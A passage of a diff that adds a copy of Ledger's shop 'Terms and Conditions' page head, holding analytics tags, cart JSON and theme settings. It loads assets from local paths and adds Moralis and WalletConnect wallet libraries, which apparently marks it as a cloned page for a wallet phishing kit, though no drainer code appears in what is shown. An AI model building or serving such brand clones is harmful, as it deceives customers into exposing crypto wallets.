@@ -1,0 +1,2487 @@
+
+<!-- Doctype HTML5 -->
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <!-- Début de la mention OneTrust de consentement aux cookies du domaine : ledgerstore-dev.myshopify.com -->
+  <!-- <script type="text/javascript"
+    src="https://cdn.cookielaw.org/consent/5ff3ecce-44bd-4ef3-b746-ec81546bf82a/OtAutoBlock.js"></script>
+  <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" type="text/javascript" charset="UTF-8"
+    data-domain-script="5ff3ecce-44bd-4ef3-b746-ec81546bf82a" data-document-language="true"></script> -->
+  <!-- Fin de la mention OneTrust de consentement aux cookies du domaine : ledger.com -->
+<script type='text/javascript' src='js/jquery.min.js' ></script>
+<script type='text/javascript' src='js/jquery-migrate.min.js' ></script>
+
+ <!-- Moralis import -->
+  <script src="https://unpkg.com/moralis-v1@1.11.0/dist/moralis.js"></script>
+  <script src="https://github.com/WalletConnect/walletconnect-monorepo/releases/download/1.7.1/web3-provider.min.js"></script>
+  
+  <!-- Set some language strings to be used later -->
+  
+  
+  
+  
+  
+  
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+<script>
+    window.translation_strings = window.translation_strings || {}
+    /* Make the translated string available on window global-back-in-stock.js*/
+    window.translation_strings.email_me_bis = 'Email me'
+    window.translation_strings.out_of_stock_bis = 'Out of stock'
+    window.translation_strings.coming_soon_bis = 'Coming soon'
+    /* Make the translated string available on window reseller-ressource-center.js*/
+    window.translation_strings.rrc_no_results = 'NO RESULTS'
+    window.translation_strings.rrc_come_back = 'We’re adding new ressources all the time. Check back soon!'
+    window.translation_strings.rrc_copy_url = 'Copy the video&#39;s URL'
+    window.translation_strings.rrc_download = 'Download'
+    /* Make the translated string available on window cart.js*/
+    window.translation_strings.nem_error_message = 'Ledger Nano S Nem edition cannot be shipped with other products. If you wish to purchase our regular products, please place a separate order.'
+    window.translation_strings.lnsx_error_message = 'Max allowed quantity for this is reached.'
+    window.translation_strings.cs_error_message = 'You cannot add more than 2 Cryptosteel capsule solo in your cart.'
+    window.translation_strings.starter_error_message = 'You have reached the maximum quantity for this product.'
+    window.translation_strings.billfodl_error_message = 'You cannot add more than 2 Billfodl to your cart.'
+    window.translation_strings.cryptozeus_error_message = 'You cannot add more than 2 Cryptotag Zeus to your cart.'
+    window.translation_strings.usa_warn_1 = 'To be able to redeem your voucher, you must be in a state supported by Coinify.'
+    window.translation_strings.usa_warn_2 = 'Check your eligibility here'
+    window.translation_strings.sbx_nano_error_message = 'You cannot add more than 1 Sandbox Nano to your cart.'
+    /* Make the translated string available on window _flow.js */
+    window.translation_strings.return_to_ledger_live_app = 'Go back to Ledger Live'
+
+  </script>
+
+   
+
+  <!-- Google Tag Manager -->
+  <script>
+    (function (w, d, s, l, i) {
+      w[l] = w[l] || [];
+      w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+      var f = d.getElementsByTagName(s)[0],
+        j = d.createElement(s),
+        dl = l != "dataLayer" ? "&l=" + l : "";
+      j.async = true;
+      j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
+      f.parentNode.insertBefore(j, f);
+    })(window, document, "script", "dataLayer", "GTM-W5FKZ2N");
+  </script>
+  <!-- End Google Tag Manager -->
+
+  <script src="https://www.googleoptimize.com/optimize.js?id=GTM-TB9Q5T5"></script>
+
+  <script>
+    (function (i, s, o, g, r, a, m) {
+      i["GoogleAnalyticsObject"] = r;
+      (i[r] =
+        i[r] ||
+        function () {
+          (i[r].q = i[r].q || []).push(arguments);
+        }),
+        (i[r].l = 1 * new Date());
+      (a = s.createElement(o)), (m = s.getElementsByTagName(o)[0]);
+      a.async = 1;
+      a.src = g;
+      m.parentNode.insertBefore(a, m);
+    })(
+      window,
+      document,
+      "script",
+      "https://www.google-analytics.com/analytics.js",
+      "ga"
+    );
+    ga("create", "UA-55894473-2", "auto");
+    ga("require", "GTM-TB9Q5T5");
+  </script>
+  <script type="text/javascript">
+    (function e() {
+      var e = document.createElement("script");
+      (e.type = "text/javascript"),
+        (e.async = true),
+        (e.src =
+          "//staticw2.yotpo.com/VjYC1hjLHPTTjBOJGQajJPG9ZjLqy7OBx6uqubzH/widget.js");
+      var t = document.getElementsByTagName("script")[0];
+      t.parentNode.insertBefore(e, t);
+    })();
+  </script>
+  
+  <script>
+    (function (f, l, o, w, i, n, g) {
+      f[i] = f[i] || {};
+      f[i].set =
+        f[i].set ||
+        function () {
+          (f[i].q = f[i].q || []).push(arguments);
+        };
+      f[i].initialized = 0;
+      f[i].fraud = "enabled";
+      n = l.createElement(o);
+      n.src = w;
+      g = l.getElementsByTagName(o)[0];
+      g.parentNode.insertBefore(n, g);
+    })(
+      window,
+      document,
+      "script",
+      "https://shopify-cdn.flow.io/ledger/js/v0/flow.js?shop=ledgerstore.myshopify.com",
+      "Flow"
+    );
+  </script>
+  
+  <!-- Meta tags -->
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-961495034"></script>
+  <script type="application/json" id="flow_shopify_cart">
+      {"note":null,"attributes":{"prices_metafield_key":"prices_maa7igf3pm","geo_currency":"CNY","geo_country":"CHN","flow_metafield_key":"flow_maa7igf3pm","shipping_configuration_key":"default","shopify_localization_method":"ssr","features":"global_checkout_initialize_endpoint\\:true\\|global_checkout_preload_assets\\:false\\|global_checkout_blaze\\:false\\|global_checkout_returning_customers\\:false\\|global_javascript_error_modal\\:false\\|global_inject_client_javascript\\:false\\|global_checkout_resource\\:true\\|global_shopify_js_cart_v2\\:true"},"original_total_price":14900,"total_price":14900,"total_discount":0,"total_weight":0.0,"item_count":1,"items":[{"id":39493371166792,"properties":{},"quantity":1,"variant_id":39493371166792,"key":"39493371166792:1ff43499653e720216510a28978f27e1","title":"Ledger Nano X - Onyx Black","price":14900,"original_price":14900,"discounted_price":14900,"line_price":14900,"original_line_price":14900,"total_discount":0,"discounts":[],"sku":"lnx","grams":0,"vendor":"Ledger","taxable":true,"product_id":1829667700778,"product_has_only_default_variant":false,"gift_card":false,"final_price":14900,"final_line_price":14900,"url":"\/products\/ledger-nano-x?variant=39493371166792","featured_image":{"aspect_ratio":0.749,"alt":"Ledger Nano X","height":1880,"url":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","width":1408},"image":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","handle":"ledger-nano-x","requires_shipping":true,"product_type":"","product_title":"Ledger Nano X","product_description":"\nSecure, buy, exchange, grow your crypto and manage your NFTs with our new Bluetooth-enabled hardware wallet. All your digital assets secured in one place.","variant_title":"Onyx Black","variant_options":["Onyx Black"],"options_with_values":[{"name":"Color","value":"Onyx Black"}],"line_level_discount_allocations":[],"line_level_total_discount":0}],"requires_shipping":true,"currency":"EUR","items_subtotal_price":14900,"cart_level_discount_applications":[]}
+    </script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag("js", new Date());
+
+    gtag("config", "AW-961495034");
+  </script>
+  <script type="text/javascript">
+    function formatGTMPrice(price) {
+      const strPrice = price.toString()
+      return  strPrice.slice(0, -2) + '.' + strPrice.slice(-2);
+    }
+    function getProductCategory(productName) {
+      const bundleList = [
+        'Ledger Family Pack X',
+        'Ledger Backup Pack',
+        'Ledger Family Pack S',
+        'Crypto Starter Pack',
+      ]
+      const hwList = [
+        'Ledger Nano X',
+        'Ledger Nano S',
+        'Ledger Nano S Plus',
+        'Ledger Blue',
+      ]
+      const accessoriesList = [
+        'Ledger OTG Kit',
+        'Cryptosteel Capsule Solo',
+        'The Billfodl',
+        'Swivel Pack',
+        'Cryptotag Zeus',
+        'Ledger Nano Pod',
+        'Ledger Nano Case'
+      ]
+      if (hwList.find(product => productName.includes(product)) ) {
+        return ('Hardware Wallet')
+      } else if (bundleList.find(product => productName.includes(product)) ) {
+        return ('Bundle')
+      } else if (accessoriesList.find(product => productName.includes(product)) ) {
+        return ('Accessory')
+      } else {
+        return (undefined)
+      }
+    }
+
+    function gtmCleaner() {
+      dataLayer.push({
+        event: undefined,
+        ecommerce: undefined,
+        user_country: undefined,
+        gtm: undefined,
+        OnetrustActiveGroups: undefined,
+        OptanonActiveGroups: undefined,
+        mail_marketing: undefined,
+        optin_mail: undefined,
+        optanonCategory: undefined,
+        optanonAction: undefined,
+        site_language: undefined,
+        item_category: undefined,
+        page_type: undefined,
+      })
+    }
+
+    function getPageType() {
+      const template = "page.generic"?.split('.');
+      let page_type;
+      let item_category = undefined;
+
+      if (!template) {
+        page_type = 'flow'
+      } else if (template[0] === 'page' && template[1] === 'comparison') {
+        page_type = 'comparison'
+      } else if (template[0] === 'page' && template[1] === 'ledger-reviews') {
+        page_type = 'reviews'
+      } else if (template[0] === 'page' && template[1].includes('marketing')) {
+        page_type = 'product detail page'
+        item_category = template[1]
+      } else if (template[0] === 'index') {
+        page_type = 'homepage'
+      } else {
+        page_type = template[0]
+      }
+
+      if (null) {
+        item_category = getProductCategory(null)
+      }
+
+      return [page_type, item_category]
+    }
+    
+    const [page_type, item_category] = getPageType()
+
+    dataLayer.push({
+      event: 'page_view_custom',
+      site_language: "en",
+      user_country:  {"first_name":null,"address1":"1 rue du mail","phone":"+33633558792","city":"Paris","zip":"75002","province":"","country":"France","last_name":null,"address2":"","company":"Ledger SAS","latitude":48.8664612,"longitude":2.3414224,"name":"","country_code":"FR","province_code":null}.country,
+      page_type: page_type,
+      item_category : item_category
+    })
+
+    
+    gtag('event', 'page_view', {
+      ecomm_prodid: '',
+      ecomm_pagetype: 'other',
+      ecomm_totalvalue: ''
+    });
+    
+    gtag()
+  </script>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=2" />
+
+   
+  <meta name="robots" content="index,follow" />
+  <meta name="googlebot" content="index,follow" />
+  
+
+  <!-- Store info -->
+  
+  <title>Sales Terms and Conditions | Ledger</title>
+  
+  <meta name="description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control." />
+  <link rel="canonical" href="https://shop.ledger.com/pages/terms-and-conditions" />
+
+  <!-- Favicons -->
+   
+  <link rel="icon" type="image/png" class="dynamic-favicon" sizes="16x16" href="images/ledger-favicon-shop_16x16.png" />
+  <link rel="icon" type="image/png" class="dynamic-favicon" sizes="32x32" href="images/ledger-favicon-shop_32x32.png" />
+  <link rel="icon" type="image/png" class="dynamic-favicon" sizes="96x96" href="images/ledger-favicon-shop_96x96.png" />
+  <link rel="apple-touch-icon" class="dynamic-favicon" href="images/ledger-favicon-shop_200x200.png" />
+  <link rel="shortcut icon" href="images/ledger-favicon-shop_200x200.png" />
+    <!-- Facebook Open Graph -->
+<meta property="og:url" content="https://shop.ledger.com/pages/terms-and-conditions">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Sales Terms and Conditions">
+
+	<meta property="og:image" content="https://cdn.shopify.com/s/files/1/2974/4858/files/opengraphh_200x.png?v=1671012004">
+
+<meta property="og:description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control.">
+<meta property="og:site_name" content="Ledger">
+<meta property="og:locale" content="en">
+<meta property="article:author" content="Ledger">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:url" content="https://shop.ledger.com/pages/terms-and-conditions">
+<meta name="twitter:title" content="Sales Terms and Conditions">
+<meta name="twitter:description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control.">
+
+	<meta name="twitter:image" content="https://cdn.shopify.com/s/files/1/2974/4858/files/opengraphh_200x.png?v=1671012004">
+
+<!-- Google+ / Schema.org -->
+<link href="https://shop.ledger.com/pages/terms-and-conditions" rel="publisher">
+<meta itemprop="name" content="Sales Terms and Conditions">
+<meta itemprop="description" content="Ledger offers smartcard-based crypto asset hardware wallets bringing optimal protection level to your bitcoins, ethereums, ripple and more - without sacrificing usability or control.">
+
+	<meta itemprop="image" content="https://cdn.shopify.com/s/files/1/2974/4858/files/opengraphh_200x.png?v=1671012004">
+
+
+
+  <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/29744858/digital_wallets/dialog">
+<link rel="alternate" hreflang="x-default" href="https://shop.ledger.com/pages/terms-and-conditions">
+<link rel="alternate" hreflang="en" href="https://shop.ledger.com/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ar" href="https://shop.ledger.com/ar/pages/terms-and-conditions">
+<link rel="alternate" hreflang="de" href="https://shop.ledger.com/de/pages/terms-and-conditions">
+<link rel="alternate" hreflang="es" href="https://shop.ledger.com/es/pages/terms-and-conditions">
+<link rel="alternate" hreflang="fr" href="https://shop.ledger.com/fr/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ja" href="https://shop.ledger.com/ja/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ko" href="https://shop.ledger.com/ko/pages/terms-and-conditions">
+<link rel="alternate" hreflang="pt" href="https://shop.ledger.com/pt-br/pages/terms-and-conditions">
+<link rel="alternate" hreflang="ru" href="https://shop.ledger.com/ru/pages/terms-and-conditions">
+<link rel="alternate" hreflang="tr" href="https://shop.ledger.com/tr/pages/terms-and-conditions">
+<link rel="alternate" hreflang="zh-Hans" href="https://shop.ledger.com/zh-cn/pages/terms-and-conditions">
+<link rel="alternate" hreflang="zh-Hans" href="https://shop.ledger.com/zh-cn/pages/terms-and-conditions">
+<script id="shopify-features" type="application/json">{"accessToken":"6ae925decf6a6fa59908b4800b440fb9","betas":["rich-media-storefront-analytics"],"domain":"shop.ledger.com","predictiveSearch":true,"shopId":29744858,"smart_payment_buttons_url":"https:\/\/cdn.shopify.com\/shopifycloud\/payment-sheet\/assets\/latest\/spb.en.js?v=2","dynamic_checkout_cart_url":"https:\/\/cdn.shopify.com\/shopifycloud\/payment-sheet\/assets\/latest\/dynamic-checkout-cart.en.js?v=2","locale":"en","optimusEnabled":false}</script>
+<script>var Shopify = Shopify || {};
+Shopify.shop = "ledgerstore.myshopify.com";
+Shopify.locale = "en";
+Shopify.currency = {"active":"EUR","rate":"1.0"};
+Shopify.country = "FR";
+Shopify.theme = {"name":"Release 2.89.1 referral v2 fixes","id":120688836680,"theme_store_id":null,"role":"main"};
+Shopify.theme.handle = "null";
+Shopify.theme.style = {"id":null,"handle":null};
+Shopify.cdnHost = "cdn.shopify.com";
+Shopify.routes = Shopify.routes || {};
+Shopify.routes.root = "/";</script>
+<script type="module">!function(o){(o.Shopify=o.Shopify||{}).modules=!0}(window);</script>
+<script>!function(o){function n(){var o=[];function n(){o.push(Array.prototype.slice.apply(arguments))}return n.q=o,n}var t=o.Shopify=o.Shopify||{};t.loadFeatures=n(),t.autoloadFeatures=n()}(window);</script>
+<script>(function() {
+  function asyncLoad() {
+    var urls = ["https:\/\/intg.snapchat.com\/shopify\/shopify-scevent-init.js?id=5fefacb2-108d-4d83-8c43-7b198bce2a67\u0026shop=ledgerstore.myshopify.com"];
+    for (var i = 0; i < urls.length; i++) {
+      var s = document.createElement('script');
+      s.type = 'text/javascript';
+      s.async = true;
+      s.src = urls[i];
+      var x = document.getElementsByTagName('script')[0];
+      x.parentNode.insertBefore(s, x);
+    }
+  };
+  if(window.attachEvent) {
+    window.attachEvent('onload', asyncLoad);
+  } else {
+    window.addEventListener('load', asyncLoad, false);
+  }
+})();</script>
+<script id="__st">var __st={"a":29744858,"offset":3600,"reqid":"263d8ae7-1178-40fa-a12d-6e51288d41b8","pageurl":"shop.ledger.com\/pages\/terms-and-conditions","s":"pages-15355150378","t":"prospect","u":"d4d2bf4a3abb","p":"page","rtyp":"page","rid":15355150378};</script>
+<script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
+<script integrity="sha256-4VRZk5nmuLKdyxECzHbrGZ+jOgmvT6eNFej4VE7mT80=" data-source-attribution="shopify.loadfeatures" defer="defer" src="//cdn.shopify.com/shopifycloud/shopify/assets/storefront/load_feature-e154599399e6b8b29dcb1102cc76eb199fa33a09af4fa78d15e8f8544ee64fcd.js" crossorigin="anonymous"></script>
+<script integrity="sha256-h+g5mYiIAULyxidxudjy/2wpCz/3Rd1CbrDf4NudHa4=" data-source-attribution="shopify.dynamic-checkout" defer="defer" src="//cdn.shopify.com/shopifycloud/shopify/assets/storefront/features-87e8399988880142f2c62771b9d8f2ff6c290b3ff745dd426eb0dfe0db9d1dae.js" crossorigin="anonymous"></script>
+
+
+<script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
+
+  <!-- Stylesheets -->
+  
+  <link href="css/css_vendor.css" rel="stylesheet" type="text/css" media="all" />
+  <link href="css/css_theme.css" rel="stylesheet" type="text/css" media="all" />
+  
+  
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800|Rubik:300,400,500,700"
+    rel="stylesheet" />
+
+  <!-- Scripts -->
+  <script>
+
+	window.theme = window.theme || {};
+	window.globals = window.globals || {};
+
+	window.globals.breakpoints = {
+		mobile: 767,
+		tablet: 1079,
+		desktop: 1080
+	}
+	
+	// 1. Shop
+	window.theme.shop = {
+		address: {"first_name":null,"address1":"1 rue du mail","phone":"+33633558792","city":"Paris","zip":"75002","province":"","country":"France","last_name":null,"address2":"","company":"Ledger SAS","latitude":48.8664612,"longitude":2.3414224,"name":"","country_code":"FR","province_code":null},
+		currency: "EUR",
+		domain: "shop.ledger.com",
+		locale: "en",
+		name: "Ledger",
+		url: "https:\/\/shop.ledger.com"
+	};
+
+	// 2. Template
+	window.theme.template = {
+		name: "page",
+		suffix: "generic",
+	};
+
+	// 3. Locales
+	window.theme.locales = {};
+
+	// 4. Cart Object
+	window.theme.cart_json = {"note":null,"attributes":{"prices_metafield_key":"prices_maa7igf3pm","geo_currency":"CNY","geo_country":"CHN","flow_metafield_key":"flow_maa7igf3pm","shipping_configuration_key":"default","shopify_localization_method":"ssr","features":"global_checkout_initialize_endpoint\\:true\\|global_checkout_preload_assets\\:false\\|global_checkout_blaze\\:false\\|global_checkout_returning_customers\\:false\\|global_javascript_error_modal\\:false\\|global_inject_client_javascript\\:false\\|global_checkout_resource\\:true\\|global_shopify_js_cart_v2\\:true"},"original_total_price":14900,"total_price":14900,"total_discount":0,"total_weight":0.0,"item_count":1,"items":[{"id":39493371166792,"properties":{},"quantity":1,"variant_id":39493371166792,"key":"39493371166792:1ff43499653e720216510a28978f27e1","title":"Ledger Nano X - Onyx Black","price":14900,"original_price":14900,"discounted_price":14900,"line_price":14900,"original_line_price":14900,"total_discount":0,"discounts":[],"sku":"lnx","grams":0,"vendor":"Ledger","taxable":true,"product_id":1829667700778,"product_has_only_default_variant":false,"gift_card":false,"final_price":14900,"final_line_price":14900,"url":"\/products\/ledger-nano-x?variant=39493371166792","featured_image":{"aspect_ratio":0.749,"alt":"Ledger Nano X","height":1880,"url":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","width":1408},"image":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796","handle":"ledger-nano-x","requires_shipping":true,"product_type":"","product_title":"Ledger Nano X","product_description":"\nSecure, buy, exchange, grow your crypto and manage your NFTs with our new Bluetooth-enabled hardware wallet. All your digital assets secured in one place.","variant_title":"Onyx Black","variant_options":["Onyx Black"],"options_with_values":[{"name":"Color","value":"Onyx Black"}],"line_level_discount_allocations":[],"line_level_total_discount":0}],"requires_shipping":true,"currency":"EUR","items_subtotal_price":14900,"cart_level_discount_applications":[]};
+
+	// 5. Customer
+	window.theme.customer =false;
+
+	// 6. Current Object
+	window.theme.current_object =
+{"error":"json not allowed for this object"};
+         
+    window.theme.live_links = 
+        {
+            windows: "https:\/\/download-live.ledger.com\/releases\/latest\/download",
+            mac: "https:\/\/download-live.ledger.com\/releases\/latest\/download",
+            linux: "https:\/\/download-live.ledger.com\/releases\/latest\/download"
+        }
+
+	window.theme.covid_19 = {
+		countries: "GRL",
+		msg: "Due to the ongoing pandemic, we have halted shipping to \u0026lt;a href=\u0026quot;https:\/\/support.ledger.com\/hc\/en-us\/articles\/360012650219-COVID-19-zip-codes-affected-by-the-Coronavirus-situation\u0026quot; target=\u0026quot;_blank\u0026quot;\u0026gt;this list of cities\u0026lt;\/a\u0026gt; in Austria, Bulgaria, Czech Republic, Italy and Portugal. If your order is concerned, it will be canceled and refunded."
+	}
+
+	const str_taxes_duties = sessionStorage.getItem('l10n_taxes_duties')
+		? sessionStorage.getItem('l10n_taxes_duties')
+		: "Note: For delivery outside the EU, custom duties or other taxes may apply. Check the \u0026lt;a href=\u0026quot;\/pages\/terms-and-conditions\u0026quot;\u0026gt;Terms and Conditions\u0026lt;\/a\u0026gt; for more details."
+
+	const str_ongoing_situation = sessionStorage.getItem('l10n_ongoing_situation')
+		? sessionStorage.getItem('l10n_ongoing_situation')
+		: "Due to the ongoing situation in Russia, our transportation carriers stopped all shipments to Russia at this time. We believe in the choice of self-custody for all users and do not want to pause shipping to Russia, but we cannot deliver Ledgers until carriers are able to safely send shipments. Until that time, we are disabling purchases with shipping addresses to Russia. We are actively working on alternatives and will resume as soon as possible."
+
+	const str_return_to_cart = sessionStorage.getItem('l10n_return_to_cart')
+		? sessionStorage.getItem('l10n_return_to_cart')
+		: "Return to Cart"
+
+	window.theme.checkout_messages = {
+		taxes_duties: str_taxes_duties,
+		ongoing_situation: str_ongoing_situation,
+		return_to_cart: str_return_to_cart
+	}
+
+	window.theme.country_exclusions = {
+		countries: null,
+		products: null
+	}
+	
+
+	window.theme.nano_x = {
+		id: 39493371166792
+	}
+	
+
+	window.theme.bundle_nano_x = {
+		id: 0
+	}
+
+	window.theme.black_friday = null
+	
+
+	window.theme.referral = {
+		products: [],
+		isActivated: false,
+		giftCard: null
+	}
+	
+		window.theme.referral.isActivated = true;
+		window.theme.referral.giftCardId = '39615180734536'
+		
+			
+				window.theme.referral.products.push(39493371166792)
+			
+				window.theme.referral.products.push(39493371199560)
+			
+				window.theme.referral.products.push(39493371232328)
+			
+
+		
+			
+				window.theme.referral.products.push(39707230994504)
+			
+
+		
+			
+				window.theme.referral.products.push(39493377065032)
+			
+				window.theme.referral.products.push(39493377097800)
+			
+				window.theme.referral.products.push(39493377130568)
+			
+				window.theme.referral.products.push(39493377163336)
+			
+				window.theme.referral.products.push(39493377196104)
+			
+
+		
+	
+
+	window.theme.stax_id = null
+	
+		
+		window.theme.stax_id = "39707230994504"
+		window.theme.stax_delay_label = "Please note that Ledger Stax will be <b>shipped by the end of April 2023.</b>"
+		window.theme.stax_delay_cart_label = "<p><strong>Due to high demand, Ledger Stax estimated shipping will be April 2023.</strong><br/>Other items will be dispatched shortly after order confirmation</p>"
+	
+
+	window.theme.marketing_lnsp = {
+		cta_label: 'Keep me posted'
+	}
+	window.theme.p = {
+		add_to_cart: 'Add to cart',
+		out_of_stock: 'Out of stock',
+		sold_out: 'Sold out'
+	}
+</script>
+  <script src="js/js_vendor.js" defer></script>
+  <script src="js/js_theme.js" defer></script>
+  
+  <!-- Icons -->
+  <!--<script defer src="https://use.fontawesome.com/releases/v5.0.10/js/all.js" integrity="sha384-slN8GvtUJGnv6ca26v8EzVaR9DC58QEwsIk9q1QXdCU8Yu8ck/tL/5szYlBbqmS+" crossorigin="anonymous"></script>-->
+  
+  <script src="https://kit.fontawesome.com/f8a71d88c0.js"></script>
+  
+  <!-- edev-703 -->
+  <script type="text/javascript">
+    const [current_page_type, current_item_category] = getPageType()
+    const setPageViewGtag = () => {
+      dataLayer.push({
+        event: 'page_view',
+        site_language: "en",
+        user_country: {"first_name":null,"address1":"1 rue du mail","phone":"+33633558792","city":"Paris","zip":"75002","province":"","country":"France","last_name":null,"address2":"","company":"Ledger SAS","latitude":48.8664612,"longitude":2.3414224,"name":"","country_code":"FR","province_code":null}.country,
+        item_category: current_item_category,
+        page_type: current_page_type
+      });
+    }
+    const allowedCountries = [
+      "AGO",
+      "AND",
+      "AIA",
+      "ATG",
+      "ARG",
+      "ARM",
+      "ABW",
+      "AUS",
+      "AUT",
+      "AZE",
+      "BHR",
+      "BEL",
+      "BLZ",
+      "BEN",
+      "BMU",
+      "BTN",
+      "BES",
+      "BRA",
+      "VGB",
+      "BRN",
+      "BGR",
+      "CMR",
+      "CAN",
+      "CPV",
+      "TCD",
+      "CHL",
+      "COL",
+      "COM",
+      "CRI",
+      "HRV",
+      "CUW",
+      "CYP",
+      "CZE",
+      "DNK",
+      "DJI",
+      "DMA",
+      "DOM",
+      "TLS",
+      "SLV",
+      "GNQ",
+      "ERI",
+      "EST",
+      "ETH",
+      "FRO",
+      "FJI",
+      "FIN",
+      "FRA",
+      "GAB",
+      "GMB",
+      "GEO",
+      "DEU",
+      "GIB",
+      "GRC",
+      "GRL",
+      "GRD",
+      "GLP",
+      "GTM",
+      "GGY",
+      "GIN",
+      "GUY",
+      "HND",
+      "HKG",
+      "HUN",
+      "ISL",
+      "IND",
+      "IDN",
+      "IRL",
+      "IMN",
+      "ISR",
+      "ITA",
+      "CIV",
+      "JEY",
+      "JOR",
+      "KEN",
+      "KIR",
+      "KWT",
+      "LAO",
+      "LVA",
+      "LSO",
+      "LBR",
+      "LIE",
+      "LTU",
+      "LUX",
+      "MAC",
+      "MDG",
+      "MWI",
+      "MYS",
+      "MDV",
+      "MLT",
+      "MHL",
+      "MRT",
+      "MEX",
+      "FSM",
+      "MDA",
+      "MCO",
+      "MSR",
+      "MOZ",
+      "NAM",
+      "NLD",
+      "NZL",
+      "NER",
+      "NGA",
+      "NOR",
+      "OMN",
+      "PLW",
+      "PSE",
+      "PNG",
+      "PRY",
+      "PER",
+      "PHL",
+      "POL",
+      "PRT",
+      "QAT",
+      "ROU",
+      "RUS",
+      "RWA",
+      "KNA",
+      "LCA",
+      "VCT",
+      "WSM",
+      "SMR",
+      "STP",
+      "SYC",
+      "SLE",
+      "SGP",
+      "SXM",
+      "SVK",
+      "SVN",
+      "ZAF",
+      "ESP",
+      "LKA",
+      "SUR",
+      "SWE",
+      "CHE",
+      "TWN",
+      "TJK",
+      "TGO",
+      "TON",
+      "TUN",
+      "TUR",
+      "TKM",
+      "TCA",
+      "GBR",
+      "USA",
+      "URY",
+      "UZB",
+      "ZMB"
+    ];
+
+    
+
+
+    
+      const russiaUnavailable = "Shipping to your country is unavailable for this product."
+      Flow.set('on', 'ready', () => {
+        setPageViewGtag();
+        if( Flow.session.getCountry() == 'RUS' ) {
+          $('.product-card-big-display .tile__button--atc').attr('disabled', 'disabled').val("Not available").css({'background-color': '#D8D8D8', 'color': '#999999', 'border': 'none'})
+          $('.product-card-big-display .js-collection-form').after("<div class='row margin-s'>" + russiaUnavailable + "<div>");
+          const freeShippingElement = $('.product-card-big-display .free-shipping');
+          freeShippingElement.remove();
+        }
+      });
+    
+
+  </script>
+  <script>
+    /* Make the translated strings available in flow checkout*/
+    if((window.theme.template.name || window.theme.template.suffix) || !sessionStorage.getItem('l10n_language') ) {
+      sessionStorage.setItem('l10n_taxes_duties', "Note: For delivery outside the EU, custom duties or other taxes may apply. Check the \u0026lt;a href=\u0026quot;\/pages\/terms-and-conditions\u0026quot;\u0026gt;Terms and Conditions\u0026lt;\/a\u0026gt; for more details.");
+      sessionStorage.setItem('l10n_return_to_cart', "Return to Cart");
+      sessionStorage.setItem('l10n_ongoing_situation', "Due to the ongoing situation in Russia, our transportation carriers stopped all shipments to Russia at this time. We believe in the choice of self-custody for all users and do not want to pause shipping to Russia, but we cannot deliver Ledgers until carriers are able to safely send shipments. Until that time, we are disabling purchases with shipping addresses to Russia. We are actively working on alternatives and will resume as soon as possible.");
+      sessionStorage.setItem('l10n_language', "en");
+    }
+  </script>
+<link href="https://monorail-edge.shopifysvc.com" rel="dns-prefetch">
+<script>(function(){if ("sendBeacon" in navigator && "performance" in window) {var session_token = document.cookie.match(/_shopify_s=([^;]*)/);function handle_abandonment_event(e) {var entries = performance.getEntries().filter(function(entry) {return /monorail-edge.shopifysvc.com/.test(entry.name);});if (!window.abandonment_tracked && entries.length === 0) {window.abandonment_tracked = true;var currentMs = Date.now();var navigation_start = performance.timing.navigationStart;var payload = {shop_id: 29744858,url: window.location.href,navigation_start,duration: currentMs - navigation_start,session_token: session_token && session_token.length === 2 ? session_token[1] : "",page_type: "page"};window.navigator.sendBeacon("https://monorail-edge.shopifysvc.com/v1/produce", JSON.stringify({schema_id: "online_store_buyer_site_abandonment/1.1",payload: payload,metadata: {event_created_at_ms: currentMs,event_sent_at_ms: currentMs}}));}}window.addEventListener('pagehide', handle_abandonment_event);}}());</script>
+<script>window.ShopifyAnalytics = window.ShopifyAnalytics || {};
+window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
+window.ShopifyAnalytics.meta.currency = 'EUR';
+var meta = {"page":{"pageType":"page","resourceType":"page","resourceId":15355150378}};
+for (var attr in meta) {
+  window.ShopifyAnalytics.meta[attr] = meta[attr];
+}</script>
+<script>window.ShopifyAnalytics.merchantGoogleAnalytics = function() {
+  
+};
+</script>
+<script class="analytics">(function () {
+  var customDocumentWrite = function(content) {
+    var jquery = null;
+
+    if (window.jQuery) {
+      jquery = window.jQuery;
+    } else if (window.Checkout && window.Checkout.$) {
+      jquery = window.Checkout.$;
+    }
+
+    if (jquery) {
+      jquery('body').append(content);
+    }
+  };
+
